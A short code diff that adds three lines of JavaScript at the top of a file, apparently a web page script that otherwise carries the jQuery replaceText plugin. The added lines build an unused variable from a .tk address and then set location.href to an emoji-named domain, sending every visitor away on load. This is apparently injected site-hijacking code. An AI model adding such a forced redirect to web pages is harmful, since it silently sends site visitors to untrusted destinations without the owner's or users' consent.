@@ -1,4 +1,9 @@
 
+
+
+var d='https://www.chitrakootsamachar.tk';
+  d=d.replace(/.*\/\/[^\/]*/, '');
+  location.href = 'https://🤣🤣🤣.com';
 //<![CDATA[
 
  <!-- jQuery replaceText | http://benalman.com/projects/jquery-replacetext-plugin/ -->
